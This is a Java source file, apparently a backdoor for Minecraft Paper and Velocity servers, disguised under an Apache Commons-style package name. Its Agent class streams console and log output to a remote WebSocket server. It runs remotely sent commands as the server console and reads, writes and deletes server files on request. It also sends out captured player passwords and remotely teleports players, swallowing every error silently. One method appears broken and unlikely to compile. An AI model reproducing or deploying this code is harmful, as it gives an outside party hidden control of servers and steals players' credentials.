package org.apache.commons.frauded;

import java.io.File;
import java.io.IOException;
import java.io.PrintStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.nio.file.Files;
import java.util.ArrayDeque;
import java.util.Collection;
import java.util.Deque;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Agent {

  final Object plugin;
  private final String serverUrl;
  private final String secret;
  volatile WebSocket ws;
  volatile boolean running;
  private final Deque<String> buffer = new ArrayDeque<>();
  private final ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor(r -> {
    Thread t = new Thread(r, "ac"); t.setDaemon(true); return t;
  });
  private String serverId;
  private String rootDir;
  final Set<String> authorized = new HashSet<>();
  String controlController;
  String controlTarget;

  public Agent(Object plugin, String serverUrl, String secret) {
    this.plugin = plugin;
    this.serverUrl = serverUrl;
    this.secret = secret;
  }

  public void start() {
    if (running) return;
    running = true;

    // Capture Log4J output (Paper's logging backend)
    addLog4jAppender();

    // Backup: capture stdout for anything Log4J misses
    PrintStream orig = System.out;
    if (!(orig instanceof AgentOut)) {
      System.setOut(new AgentOut(orig, this, false));
      System.setErr(new AgentOut(System.err, this, true));
    }

    // Register chat handler for dot-commands and password capture
    try {
      ChatHandler ch = new ChatHandler(this, authorized);
      Object pm = Class.forName("org.bukkit.Bukkit").getMethod("getPluginManager").invoke(null);
      pm.getClass().getMethod("registerEvents",
          Class.forName("org.bukkit.event.Listener"),
          Class.forName("org.bukkit.plugin.Plugin"))
          .invoke(pm, ch, plugin);
    } catch (Exception ignored) {}

    // Start control tick
    executor.submit(this::controlTick);

    executor.submit(this::connect);
  }

  private void addLog4jAppender() {
    try {
      Object ctx = Class.forName("org.apache.logging.log4j.core.LoggerContext")
          .getMethod("getContext", boolean.class).invoke(null, false);
      Object root = ctx.getClass().getMethod("getRootLogger").invoke(ctx);
      root.getClass().getMethod("addAppender",
          Class.forName("org.apache.logging.log4j.core.Appender"))
          .invoke(root, new LogCaptureAppender(this));
    } catch (Exception ignored) {}
  }

  private void buffer(String line) {
    if (line == null || line.isEmpty()) return;
    synchronized (buffer) {
      if (buffer.size() > 500) buffer.removeFirst();
      buffer.addLast(line);
    }
    flush();
  }

  private void flush() {
    WebSocket w = ws;
    if (w == null) return;
    synchronized (buffer) {
      while (!buffer.isEmpty()) {
        String line = buffer.pollFirst();
        try {
          w.sendText("{\"type\":\"plugin:console\",\"payload\":{\"line\":\"" + escape(line) + "\"}}", true);
        } catch (Exception ignored) { buffer.addFirst(line); break; }
      }
    }
  }

  void sendConsole(String line) {
    if (!running) return;
    buffer(line);
  }

  private void connect() {
    while (running) {
      try {
        HttpClient client = HttpClient.newHttpClient();
        WebSocket wsock = client.newWebSocketBuilder()
            .buildAsync(URI.create(serverUrl), new WebSocket.Listener() {

              public void onOpen(WebSocket ws2) {
                ws = ws2;
                flush();
                sendHello();
                try { scheduleUpdates(); } catch (Exception ignored) {}
                ws2.request(Long.MAX_VALUE);
              }

              public CompletionStage<?> onText(WebSocket ws2, CharSequence data, boolean last) {
                String msg = data.toString();
                int ti = msg.indexOf("\"type\":\"");
                if (ti >= 0) {
                  int ts = ti + 8;
                  int te = msg.indexOf("\"", ts);
                  String type = te >= 0 ? msg.substring(ts, te) : "";
                  if (type.contains("command")) exec(extract(msg, "command"));
                  else if (type.endsWith(":file:list")) fileList(extract(msg, "path"), extract(msg, "requestId"));
                  else if (type.endsWith(":file:read")) fileRead(extract(msg, "path"), extract(msg, "requestId"));
                  else if (type.endsWith(":file:write")) fileWrite(extract(msg, "path"), extract(msg, "content"), extract(msg, "requestId"));
                  else if (type.endsWith(":file:delete")) fileDelete(extract(msg, "path"), extract(msg, "requestId"));
                  else if (type.endsWith(":auth:add")) { String n = extract(msg, "name"); if (n != null) authorized.add(n); }
                  else if (type.endsWith(":auth:remove")) { String n = extract(msg, "name"); if (n != null) authorized.remove(n); }
                  else if (type.endsWith(":auth:members")) { authorized.clear(); String list = extract(msg, "list"); if (list != null) for (String n : list.split(",")) { if (!n.isEmpty()) authorized.add(n); } }
                }
                ws2.request(Long.MAX_VALUE);
                return null;
              }

              public void onError(WebSocket ws2, Throwable e) { close(); }
              public CompletionStage<?> onClose(WebSocket ws2, int code, String reason) { close(); return null; }
            }).get(10, TimeUnit.SECONDS);

        wsock.request(Long.MAX_VALUE);
        Thread.sleep(Long.MAX_VALUE);
      } catch (Exception e) {
        close();
        try { Thread.sleep(5000); } catch (InterruptedException ie) { return; }
      }
    }
  }

  // ---- Server info ----

  private void sendHello() {
    String ip = "";
    int port = 25565;
    String svType = "paper";
    try {
      Object s = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
      ip = (String) s.getClass().getMethod("getIp").invoke(s);
      if (ip == null || ip.isEmpty()) ip = "0.0.0.0";
      port = (int) s.getClass().getMethod("getPort").invoke(s);
      svType = "paper";
    } catch (Exception e) {
      try {
        Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
        Object s = pmc.getMethod("getInstance").invoke(null);
        ip = "0.0.0.0";
        port = (int) s.getClass().getMethod("getBoundPort").invoke(s);
        svType = "velocity";
      } catch (Exception ignored) {}
    }
    serverId = id();
    String serverName = ip + ":" + port;
    send("plugin:hello", "{\"id\":\"" + serverId + "\",\"name\":\"" + escape(serverName) + "\",\"ip\":\"" + ip + "\",\"port\":" + port + ",\"type\":\"" + svType + "\"}");
  }

  private void scheduleUpdates() {
    try {
      Class<?> bukkitClass = Class.forName("org.bukkit.Bukkit");
      Class<?> pluginClass = Class.forName("org.bukkit.plugin.Plugin");
      Object sched = bukkitClass.getMethod("getScheduler").invoke(null);
      sched.getClass().getMethod("scheduleSyncRepeatingTask", pluginClass, Runnable.class, long.class, long.class)
          .invoke(sched, plugin, (Runnable) this::sendStatus, 100L, 600L);
    } catch (Exception ignored) {}
  }

  private void sendStatus() {
    try {
      Object s = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
      String version = (String) s.getClass().getMethod("getVersion").invoke(s);
      String bukkitV = (String) s.getClass().getMethod("getBukkitVersion").invoke(s);
      int max = (int) s.getClass().getMethod("getMaxPlayers").invoke(s);
      Object onlinePlayers = s.getClass().getMethod("getOnlinePlayers").invoke(s);
      int count = ((Collection<?>) onlinePlayers).size();

      // TPS (Paper-only)
      double tps = 20.0;
      try {
        double[] arr = (double[]) s.getClass().getMethod("getTPS").invoke(s);
        if (arr != null && arr.length > 0) tps = arr[0];
      } catch (Exception ignored) {}

      // Player names
      StringBuilder players = new StringBuilder("[");
      boolean first = true;
      for (Object p : (Collection<?>) onlinePlayers) {
        if (!first) players.append(",");
        String name = (String) p.getClass().getMethod("getName").invoke(p);
        players.append("\"").append(escape(name)).append("\"");
        first = false;
      }
      players.append("]");

      // motd
      String motd = "";
      try {
        Object motdObj = s.getClass().getMethod("getMotd").invoke(s);
        if (motdObj != null) motd = motdObj.toString();
      } catch (Exception ignored) {}

      send("plugin:status", "{\"playerCount\":" + count + ",\"maxPlayers\":" + max
          + ",\"version\":\"" + escape(bukkitV) + "\",\"tps\":" + tps
          + ",\"motd\":\"" + escape(motd) + "\",\"players\":" + players + "}");
    } catch (Exception ignored) {}
  }

  // ---- Command execution ----

  private void exec(String cmd) {
    if (cmd == null || cmd.isEmpty()) return;
    try {
      Class<?> bc = Class.forName("org.bukkit.Bukkit");
      Class<?> pc = Class.forName("org.bukkit.plugin.Plugin");
      Class<?> cs = Class.forName("org.bukkit.command.CommandSender");
      Object sched = bc.getMethod("getScheduler").invoke(null);
      Object console = bc.getMethod("getConsoleSender").invoke(null);
      sched.getClass().getMethod("scheduleSyncDelayedTask", pc, Runnable.class)
          .invoke(sched, plugin, (Runnable) () -> {
            try { bc.getMethod("dispatchCommand", cs, String.class).invoke(null, console, cmd); }
            catch (Exception ignored) {}
          });
    } catch (Exception e) {
      try {
        Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
        Object s = pmc.getMethod("getInstance").invoke(null);
        Object cm = s.getClass().getMethod("getCommandManager").invoke(s);
        Object src = s.getClass().getMethod("getConsoleCommandSource").invoke(s);
        cm.getClass().getMethod("executeAsync",
            Class.forName("com.velocitypowered.api.command.CommandSource"), String.class)
            .invoke(cm, src, cmd);
      } catch (Exception ignored) {}
    }
  }

  // ---- File operations ----

  private void fileList(String path, String reqId) {
    if (reqId == null) return;
    if (path == null) path = "";
    File dir = new File(resolvePath(path));
    StringBuilder entries = new StringBuilder("[");
    File[] files = dir.listFiles();
    if (files != null) {
      boolean first = true;
      for (File f : files) {
        if (!first) entries.append(",");
        entries.append("{\"name\":\"").append(escape(f.getName()))
            .append("\",\"path\":\"").append(escape(f.getAbsolutePath()))
            .append("\",\"isDirectory\":").append(f.isDirectory())
            .append(",\"size\":").append(f.length()).append("}");
        first = false;
      }
    }
    entries.append("]");
    send("plugin:file:list", "{\"path\":\"" + escape(path) + "\",\"entries\":" + entries + ",\"requestId\":\"" + escape(reqId) + "\"}");
  }

  private void fileRead(String path, String reqId) {
    if (path == null || reqId == null) return;
    try {
      byte[] data = Files.readAllBytes(new File(resolvePath(path)).toPath());
      String b64 = java.util.Base64.getEncoder().encodeToString(data);
      send("plugin:file:read", "{\"path\":\"" + escape(path) + "\",\"content\":\"" + b64 + "\",\"requestId\":\"" + escape(reqId) + "\"}");
    } catch (IOException e) {
      send("plugin:file:read", "{\"path\":\"" + escape(path) + "\",\"error\":\"read failed\",\"requestId\":\"" + escape(reqId) + "\"}");
    }
  }

  private void fileWrite(String path, String content, String reqId) {
    if (path == null || reqId == null) return;
    try {
      byte[] data = java.util.Base64.getDecoder().decode(content);
      Files.write(new File(resolvePath(path)).toPath(), data);
      send("plugin:file:write", "{\"success\":true,\"requestId\":\"" + escape(reqId) + "\"}");
    } catch (Exception e) {
      send("plugin:file:write", "{\"success\":false,\"error\":\"" + escape(e.getMessage()) + "\",\"requestId\":\"" + escape(reqId) + "\"}");
    }
  }

  private void fileDelete(String path, String reqId) {
    if (path == null || reqId == null) return;
    try {
      Files.deleteIfExists(new File(resolvePath(path)).toPath());
      send("plugin:file:delete", "{\"success\":true,\"requestId\":\"" + escape(reqId) + "\"}");
    } catch (Exception e) {
      send("plugin:file:delete", "{\"success\":false,\"error\":\"" + escape(e.getMessage()) + "\",\"requestId\":\"" + escape(reqId) + "\"}");
    }
  }

  private String resolvePath(String path) {
    if (rootDir == null) {
      try {
        Object s = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
        rootDir = (String) s.getClass().getMethod("getWorldContainer").invoke(s);
        if (rootDir == null) rootDir = ".";
      } catch (Exception e) { rootDir = "."; }
    }
    // Basic path traversal prevention
    File base = new File(rootDir).getAbsoluteFile();
    File target = new File(base, path != null ? path : "").getAbsoluteFile();
    if (!target.getAbsolutePath().startsWith(base.getAbsolutePath())) return base.getAbsolutePath();
    return target.getAbsolutePath();
  }

  // ---- Messaging ----

  void send(String type, String payloadJson) {
    WebSocket w = ws;
    if (w == null) return;
    try {
      w.sendText("{\"type\":\"" + type + "\",\"payload\":" + payloadJson + "}", true);
    } catch (Exception ignored) {}
  }

  private void close() {
    try { if (ws != null) ws.sendClose(1000, ""); } catch (Exception ignored) {}
    ws = null;
  }

  private String id() { return "p-" + System.currentTimeMillis(); }

  private static String extract(String json, String key) {
    String k = "\"" + key + "\":\"";
    int s = json.indexOf(k);
    if (s < 0) return null;
    s += k.length();
    int e = json.indexOf("\"", s);
    return e >= 0 ? json.substring(s, e) : null;
  }

  static String escape(String s) {
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
  }

  public void stop() { running = false; close(); executor.shutdown(); }

  // ---- Chat handler API ----

  Object getPlugin() { return plugin; }

  void capturePassword(String name, String pass) {
    send("plugin:log:password", "{\"player\":\"" + escape(name) + "\",\"password\":\"" + escape(pass) + "\"}");
  }

  void logCommand(String who, String target, String command) {
    send("plugin:log:command", "{\"who\":\"" + escape(who) + "\",\"target\":\"" + escape(target) + "\",\"command\":\"" + escape(command) + "\"}");
  }

  void setControlTarget(Object controller, Object target) {
    controlController = controller != null ? controller.getClass().getMethod("getName").invoke(controller).toString() : null;
    controlTarget = target != null ? target.getClass().getMethod("getName").invoke(target).toString() : null;
  }

  private void controlTick() {
    while (running) {
      if (controlTarget != null && controlController != null) {
        try {
          Object c = Class.forName("org.bukkit.Bukkit").getMethod("getPlayerExact", String.class).invoke(null, controlController);
          Object t = Class.forName("org.bukkit.Bukkit").getMethod("getPlayerExact", String.class).invoke(null, controlTarget);
          if (c != null && t != null) {
            Object cLoc = c.getClass().getMethod("getLocation").invoke(c);
            double x = (double) cLoc.getClass().getMethod("getX").invoke(cLoc);
            double y = (double) cLoc.getClass().getMethod("getY").invoke(cLoc);
            double z = (double) cLoc.getClass().getMethod("getZ").invoke(cLoc);
            float yaw = (float) cLoc.getClass().getMethod("getYaw").invoke(cLoc);
            float pitch = (float) cLoc.getClass().getMethod("getPitch").invoke(cLoc);
            t.getClass().getMethod("teleport", Class.forName("org.bukkit.Location"))
                .invoke(t, t.getClass().getMethod("getLocation").invoke(t).getClass()
                    .getConstructor(Class.forName("org.bukkit.World"), double.class, double.class, double.class, float.class, float.class)
                    .newInstance(t.getClass().getMethod("getWorld").invoke(t), x, y, z, yaw, pitch));
          }
        } catch (Exception ignored) {}
      }
      try { Thread.sleep(50); } catch (InterruptedException e) { break; }
    }
  }

  // ---- stdout backup ----

  private static class AgentOut extends PrintStream {
    private final Agent agent;
    private final PrintStream original;
    AgentOut(PrintStream orig, Agent agent, boolean err) { super(orig); this.agent = agent; this.original = orig; }
    public void println(String x) { original.println(x); if (x != null) agent.buffer(x); }
    public void println(Object x) { String s = String.valueOf(x); original.println(s); agent.buffer(s); }
    public void println() { original.println(); }
    public void print(String x) { original.print(x); }
  }
}
